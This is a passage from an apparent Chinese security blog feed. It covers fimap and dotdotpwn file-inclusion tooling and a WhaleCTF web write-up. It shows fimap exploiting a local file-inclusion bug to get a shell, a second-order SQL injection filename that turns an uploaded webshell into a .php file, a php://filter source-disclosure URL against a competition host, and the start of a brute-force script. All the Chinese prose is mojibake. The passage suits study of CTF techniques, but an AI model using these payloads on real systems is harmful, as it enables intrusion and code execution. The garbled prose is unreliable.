id="fimap">fimap</h3><p>ä¸€æ—¦ä½ çš„allow_url_includeæ‰“å¼€äº†,fimapå°±å¯ä»¥ç»™ä½ ä¸€ä¸ªshell,å½“ç„¶,ä½ ä¹Ÿå¯ä»¥reverseå›æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:/var/www/html$ fimap --enable-color -x -u &quot;http://127.0.0.1/index.php?file=index.php&quot;</span><br><span class="line">fimap v.1.00_svn (My life for Aiur)</span><br><span class="line">:: Automatic LFI/RFI scanner and exploiter</span><br><span class="line">:: by Iman Karim (fimap.dev@gmail.com)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">:: List of Domains ::    <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[1] 127.0.0.1            <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[q] Quit                 <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">##########################</span></span></span><br><span class="line">Choose Domain: 1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">:: FI Bugs on <span class="string">&#x27;127.0.0.1&#x27;</span> ::                                                                  <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[1] URL: <span class="string">&#x27;/index.php?file=index.php&#x27;</span> injecting file: <span class="string">&#x27;php://input&#x27;</span> using GET-param: <span class="string">&#x27;file&#x27;</span>    <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[q] Quit                                                                                      <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###############################################################################################</span></span></span><br><span class="line">Choose vulnerable script: 1</span><br><span class="line">[09:06:07] [INFO] Testing PHP-code injection thru POST...</span><br><span class="line">[09:06:08] [OUT] PHP Injection works! Testing if execution works...</span><br><span class="line">[09:06:08] [INFO] Testing execution thru &#x27;popen[b64]&#x27;...</span><br><span class="line">[09:06:08] [OUT] Execution thru &#x27;popen[b64]&#x27; works!</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">:: Available Attacks - PHP and SHELL access ::    <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###################################################</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[1] Spawn fimap shell                             <span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">[2] Spawn pentestmonkey<span class="string">&#x27;s reverse shell           #</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">[3] [Test Plugin] Show some info                  #</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">[q] Quit                                          #</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">###################################################</span></span></span><br><span class="line">Choose Attack: 1</span><br><span class="line">Please wait - Setting up shell (one request)...</span><br><span class="line">-------------------------------------------</span><br><span class="line">Welcome to fimap shell!</span><br><span class="line">Better don&#x27;t start interactive commands! ;)</span><br><span class="line">Also remember that this is not a persistent shell.</span><br><span class="line">Every command opens a new shell and quits it after that!</span><br><span class="line">Enter &#x27;q&#x27; to exit the shell.</span><br><span class="line">-------------------------------------------</span><br><span class="line">fishell@www-data:/var/www/html$&gt; id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">fishell@www-data:/var/www/html$&gt; </span><br></pre></td></tr></table></figure><h3 id="dotdotpwn">dotdotpwn</h3><p>ç”¨æ¥fuzzæ–‡ä»¶çš„ä¸€ä¸ªå·¥å…· é¦–å…ˆå‘½ä»¤ä½¿ç”¨ä¾‹å­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotdotpwn -m &#x27;http-url&#x27; -u &quot;http://127.0.0.1/index.php?file=TRAVERSAL&quot; -k &quot;root&quot;</span><br></pre></td></tr></table></figure><p>ç»™ä¸€éƒ¨åˆ†ç»“æœ <img src="/images/2018/09/2018-09-07-17-09-34å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¯ä»¥çœ‹åˆ°å·¥å…·åœ¨fuzzå¯èƒ½çš„<code>.</code>å’Œ<code>/</code>çš„ç»•è¿‡</p><hr /><p>åˆ©ç”¨æš‚æ—¶å¤§æ¦‚å°±è¿™äº›äº†,åç»­æœ‰æ–°çš„çŸ¥è¯†å­¦ä¹ çš„è¯ä¼šç»§ç»­è¡¥å……</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WhaleCTFç»ƒä¹ </title>
      <link href="/2018/09/05/whalectf%E7%BB%83%E4%B9%A0/"/>
      <url>/2018/09/05/whalectf%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å·¥ä½œå®¤ç¾¤é‡Œç”©äº†ä¸ªæ¯”èµ›,ç®€å•ç»ƒä¹ ä¸€ä¸‹web</p><h2 id="è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ">è“é²¸æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ</h2><p>å·¥ä½œå®¤åŒå­¦è®²è¿‡çš„åŸé¢˜ upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: ä¸‹åˆ8:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOT&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$path_parts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>] = <span class="string">&quot;.&quot;</span> . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$path_parts</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;file is exists&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file[&quot;tmp_name&quot;], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], ROOT . UPLOAD_DIR . <span class="variable">$name</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . UPLOAD_DIR . <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;upload error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">error_get_last</span>());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸€ä¸ªphithonè¡¨æ˜é¢˜ç›®æ¥æº.. ç„¶årename.phpçš„ä¸»è¦ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: ä¸‹åˆ9:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;ROOT&#x27;</span>,<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = <span class="title function_ invoke__">basename</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">errorInfo</span>());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$oldname</span> = ROOT.UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>].<span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="variable">$newname</span> = ROOT.UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>].<span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">rename</span>(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">            <span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="variable">$oldname</span>.<span class="string">&quot; not exists.&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„äºŒæ¬¡æ³¨å…¥ æœ‰ä¸€ä¸ªä¸Šä¼ çš„ç‚¹,æ€è·¯å°±æ˜¯ä¸Šä¼ jpgæ–‡ä»¶ç„¶åäºŒæ¬¡æ³¨å…¥æ”¹åç¼€,renameæˆphpæ–‡ä»¶ é¦–å…ˆä¼ ä¸€ä¸ªæ³¨å…¥çš„æ–‡ä»¶,æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,`extension`=&#x27;&#x27;,`filename`=&#x27;blacsheep.jpg.jpg</span><br></pre></td></tr></table></figure><p>é‡Œé¢å†™å¥½shell <img src="/images/2018/09/2018-09-05-12-36-22å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå»renameä¸€ä¸‹<code>',`extension`='',`filename`='blacsheep.jpg.jpg</code>renameæˆ<code>blacsheep.jpg</code>,ç„¶årenameçš„æ—¶å€™è¿™é‡Œä¼šè‡ªå·±åŠ åç¼€,æ‰€ä»¥æ–‡ä»¶è¢«renameæˆäº†blacsheep.jpg.jpg,è€Œæ•°æ®åº“ä¸­å› ä¸ºæ³¨å…¥çš„åŸå› æ‰€ä»¥æ˜¯blacsheep.jpg <img src="/images/2018/09/2018-09-05-12-36-47å±å¹•æˆªå›¾.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-05-12-36-53å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åæˆ‘ä»¬ä¼ ä¸€ä¸ªblacsheep.jpg,å†å»rename.phpé‡ŒæŠŠblacsheep.jpgç»™renameæˆblacsheep.php <img src="/images/2018/09/2018-09-05-12-37-11å±å¹•æˆªå›¾.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-05-12-37-28å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¿™é‡Œä¼šå…ˆå»æŸ¥æ‰¾blacsheep.jpg,ç„¶åå‘ç°äº†æˆ‘ä»¬çš„æ³¨å…¥çš„è®°å½•,åŠ ä¸Šextä¹‹åæ–‡ä»¶åä¸ºblacsheep.jpg,åˆšåˆšå¥½æˆ‘ä»¬ä¸Šä¼ äº†è¿™ä¸ªæ–‡ä»¶,é‚£ä¹ˆå¯¹æ–‡ä»¶çš„renameçš„æ—¶å€™ä¹Ÿå°±æ²¡æœ‰é—®é¢˜äº† <img src="/images/2018/09/2018-09-05-12-37-34å±å¹•æˆªå›¾.png" alt="blacsheep" /> æŸ¥çœ‹ä¸‹ <img src="/images/2018/09/2018-09-05-12-37-52å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="è“é²¸ç¬”è®°ç®¡ç†ç³»ç»Ÿ">è“é²¸ç¬”è®°ç®¡ç†ç³»ç»Ÿ</h2><p>è¿™ä¸ªé¢˜å‡ºçš„è¿˜è›®å¥½çš„,è®°å½•ä¸€ä¸‹ ä¸€å‡ºæ¥æ˜¯ä¸ªæ³¨å†Œç™»å½•,ç„¶åé‡Œé¢æœ‰ä¸ªç•™è¨€åŠŸèƒ½,æµ‹è¯•ä¸€ä¸‹sqlæ³¨å…¥,å¤±è´¥ è™½ç„¶æœ‰æ€è€ƒåˆ°æ–‡ä»¶åŒ…å«,ä½†æ˜¯å‘ç°webç›®å½•å¹¶æ²¡æœ‰login.php åæ¥çœ‹wpæ‰çŸ¥é“å‰é¢çš„actionæ˜¯æ–‡ä»¶å¤¹,åé¢çš„modeæ˜¯æ–‡ä»¶å,ä¹Ÿå°±ç­‰ä»·äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $action.&quot;/&quot;.$mode.&quot;.php&quot;;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ„é€ ä¸€ä¸‹æ‹¿åˆ°indexçš„æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://106.39.10.134:10002/index.php?action=php://filter/read=convert.base64-encode/resource=.&amp;mode=index</span><br></pre></td></tr></table></figure><p>index.phpçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DIR_PERMITION&quot;</span>,<span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="comment">// phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span>(<span class="params"><span class="variable">$array</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">              !<span class="title function_ invoke__">get_magic_quotes_gpc</span>()&amp;&amp;<span class="variable">$value</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">              <span class="variable">$array</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="variable">$array</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$array</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST</span>=<span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_GET</span>=<span class="title function_ invoke__">d_addslashes</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;common.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ./index.php?action=front&amp;mode=login&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.&#123;2&#125;/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9A-Za-z]+$/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$mode</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$action</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$mode</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// echo $file;</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid Request!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åè¯»common.php,æ‰«ç›®å½•å‘ç°adminç›®å½•,ç„¶åè¯»ä¸€ä¸‹adminä¸‹é¢çš„loginå’Œindex å‘ç°adminçš„ç™»å½•éœ€è¦çŒœéšæœºæ•°,ä¸è¿‡åªæœ‰6ä½,è€Œä¸”è¿˜æ˜¯ä»…æœ‰'wh'æ„æˆçš„,å†™ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹,ç®€æ˜“è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">str1</span>):</span><br><span class="line">    res_md5 = hashlib.md5()</span><br><span class="line">    res_md5.update(<span class="built_in">str</span>(str1).encode())</span><br><span class="line">    <span class="keyword">return</span> res_md5.hexdigest()</span><br><span 